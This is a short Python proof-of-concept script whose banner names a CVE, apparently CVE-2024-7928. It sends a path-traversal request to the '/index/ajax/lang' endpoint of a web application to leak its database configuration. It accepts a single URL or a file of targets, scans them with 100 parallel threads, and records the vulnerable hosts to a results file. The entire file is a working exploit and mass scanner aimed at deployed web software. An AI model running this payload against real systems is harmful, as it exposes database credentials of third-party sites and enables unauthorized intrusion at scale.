import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
    
     ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗   ███████╗ █████╗ ██████╗  █████╗ 
    ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║   ╚════██║██╔══██╗╚════██╗██╔══██╗
    ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ ██╔╝╚██████║ █████╔╝╚█████╔╝
    ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔╝  ╚═══██║██╔═══╝ ██╔══██╗
    ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ██║   █████╔╝███████╗╚█████╔╝
     ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚═╝   ╚════╝ ╚══════╝ ╚════╝
    """


def poc(target):
    payloay = "/index/ajax/lang?lang=..//..//application/database"
    try:
        res = requests.get(url=target+payloay,verify=False)
        if "jsonpReturn" in res.text:
            print(f"[+]{target}存在信息泄露")
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}\n")
        elif res.status_code!=200:
            print(f"[?]{target}网站未响应，请手工测试")
        else:
            print(f"[-]{target}此网站不存在信息漏洞")
    except Exception as e:
        print(f"[?]{target}网站异常")




def main():
    banner()
    parse= argparse.ArgumentParser()
    parse.add_argument('-u','--url',dest='url',type=str,help='please input url')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input file')
    args=parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

if __name__ == '__main__':
    main()